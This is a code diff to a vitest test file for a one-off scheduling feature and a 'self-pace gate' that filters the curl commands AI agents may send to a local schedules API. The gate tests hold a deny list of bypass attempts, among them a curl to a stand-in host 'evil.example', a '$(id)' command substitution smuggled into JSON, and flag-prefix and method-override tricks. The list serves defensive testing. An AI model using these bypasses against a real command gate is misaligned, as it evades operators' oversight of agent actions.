@@ -1,10 +1,11 @@
 import { describe, expect, it, vi } from 'vitest'
-import { mkdtempSync, statSync } from 'node:fs'
+import { appendFileSync, mkdtempSync, readFileSync, statSync } from 'node:fs'
 import { tmpdir } from 'node:os'
-import { join } from 'node:path'
+import { dirname, join } from 'node:path'
+import { fileURLToPath } from 'node:url'
 import {
   validateOnceRequest, createOnceTask, shouldAlertCap, parseOnceRunAt, cronForInstant,
-  readOnceAnchors, recordOnceAnchor,
+  readOnceAnchors, recordOnceAnchor, isOnceTask,
   ONCE_MAX_PER_AGENT_PER_DAY, ONCE_MAX_GLOBAL_PER_DAY, ONCE_MAX_PENDING_PER_AGENT,
   type OnceDeps, type OnceAnchorMessage, type OnceAnchorRecord, type OnceRequestBody, type OnceIo, type OncePlan,
 } from '../web/once-schedule.js'
@@ -16,6 +17,7 @@ import { gateDecision, onceCommandAllowed } from '../../scripts/self-pace-gate.m
 // wake-up from becoming the 2026-06-26 self-pace loop, and the gate's
 // whole-command exception.
 
+const __dirname = dirname(fileURLToPath(import.meta.url))
 const NOW = Date.parse('2026-11-12T07:00:00.000Z') // 08:00 Budapest
 const TZ = 'Europe/Budapest'
 const S = NOW / 1000
@@ -206,13 +208,28 @@ describe('once helpers', () => {
     expect(cronForInstant(Date.parse('2026-07-31T10:30:00Z'), TZ)).toBe('30 12 31 7 *')
     expect(cronForInstant(Date.parse('2026-12-24T17:00:00Z'), TZ)).toBe('0 18 24 12 *')
   })
-  it('the anchor ledger round-trips, skips a broken line and is owner-only', () => {
+  it('the anchor ledger round-trips, is owner-only, and COUNTS a broken line (fail-closed, Viktor 38943 #5)', () => {
     const path = join(mkdtempSync(join(tmpdir(), 'once-ledger-')), 'a.jsonl')
-    expect(readOnceAnchors(path)).toEqual([])
+    expect(readOnceAnchors(path)).toEqual({ anchors: [], malformed: 0 })
     recordOnceAnchor({ msgId: 1, agent: 'pulzus', name: 'n', at: 5 }, path)
     recordOnceAnchor({ msgId: 2, agent: 'dave', name: 'm', at: 6 }, path)
-    expect(readOnceAnchors(path).map(a => a.msgId)).toEqual([1, 2])
+    expect(readOnceAnchors(path).anchors.map(a => a.msgId)).toEqual([1, 2])
+    expect(readOnceAnchors(path).malformed).toBe(0)
     expect(statSync(path).mode & 0o777).toBe(0o600)
+    appendFileSync(path, '{"msgId":3,"agent"\n{"msgId":"4","agent":"x","name":"y","at":1}\n')
+    expect(readOnceAnchors(path).malformed).toBe(2)
+  })
+  it('a once-task cannot be edited: the PUT route refuses it before reading the body (Viktor 38943 #2)', () => {
+    expect(isOnceTask({ runAt: NOW })).toBe(true)
+    expect(isOnceTask({})).toBe(false)
+    expect(isOnceTask(null)).toBe(false)
+    const src = readFileSync(join(__dirname, '..', 'web', 'routes', 'schedules.ts'), 'utf-8')
+    const put = src.indexOf("scheduleUpdateMatch && method === 'PUT'")
+    const refusal = src.indexOf('ONCE_EDIT_REFUSAL', put)
+    const bodyRead = src.indexOf('readBody(req', put)
+    expect(put).toBeGreaterThan(0)
+    expect(refusal).toBeGreaterThan(put)
+    expect(refusal).toBeLessThan(bodyRead)
   })
   it('taskOccurrenceMs: runAt replaces the cron, with no lower bound', () => {
     expect(taskOccurrenceMs({ schedule: '* * * * *', runAt: NOW - 10 * 3600_000 }, NOW - 60_000, NOW)).toBe(NOW - 10 * 3600_000)
@@ -228,7 +245,7 @@ describe('self-pace gate: the whole-command /api/schedules/once exception (Vikto
   it('lets the documented recipe through (heredoc, inline -d, with and without -X POST)', () => {
     expect(deny(`curl -s -X POST ${URL} ${H} --data-binary @- <<'JSON'\n{"agent":"pulzus","inMinutes":30,"originMsgId":38752}\nJSON`)).toBe(false)
     expect(deny(`curl -s -X POST ${URL} ${H} -d '{"agent":"pulzus","inMinutes":30,"originMsgId":38752}'`)).toBe(false)
-    expect(deny(`curl -s ${URL} ${H} --data-binary @/tmp/o.json`)).toBe(false)
+    expect(deny(`curl -sS --max-time 10 -X POST ${URL} ${H} -H "X-Agent-Id: pulzus" --data-binary @- <<'JSON'\n{"agent":"pulzus","inMinutes":5,"originMsgId":1}\nJSON`)).toBe(false)
   })
 
   it('denies every chain, method override and path trick', () => {
@@ -258,13 +275,24 @@ describe('self-pace gate: the whole-command /api/schedules/once exception (Vikto
       `curl -s -X POST http://localhost:3420/api/schedules -d @x.json`,
       `curl -s -X POST ${URL} ${H} --data-binary @- <<'JSON'\n{"next":"/api/schedules/x"}\nJSON`,
       `curl -s -X POST ${URL} ${H} --data-binary @- <<JSON\n{"agent":"$(id)"}\nJSON`,
+      // Viktor 38943 #1: merged short flags, long-option prefixes, output, foreign host
+      `curl -s -sXPUT ${URL} ${H} -d @x`,
+      `curl -s -sXDELETE ${URL} ${H}`,
+      `curl -s --requ PUT ${URL} ${H} -d @x`,
+      `curl -s --conf /tmp/x -X POST ${URL} ${H} -d @x`,
+      `curl -s --nex -X POST ${URL} ${H} -d @x`,
+      `curl -s -o /tmp/x -X POST ${URL} ${H} -d @x`,
+      `curl -s -X POST https://evil.example/api/schedules/once ${H} -d @x`,
+      `curl -s -X POST --url ${URL} ${H} -d @x`,
+      `curl -s -X POST ${URL} ${H} -d @/tmp/payload.json`,
+      `curl -s -X POST ${URL} -H "X-Evil: 1" ${H} -d @-`,
     ]
     const passed = bad.filter(c => !deny(c))
     expect(passed, `commands the gate let through:\n${passed.join('\n')}`).toEqual([])
   })
 
   it('onceCommandAllowed is the whole-command test, and a GET of the list stays allowed', () => {
-    expect(onceCommandAllowed(`curl -s -X POST ${URL} ${H} -d @x`)).toBe(true)
+    expect(onceCommandAllowed(`curl -s -X POST ${URL} ${H} -d @-`)).toBe(true)
     expect(onceCommandAllowed(`echo hi; curl -s -X POST ${URL} ${H} -d @x`)).toBe(false)
     expect(deny('curl -s http://localhost:3420/api/schedules')).toBe(false)
   })
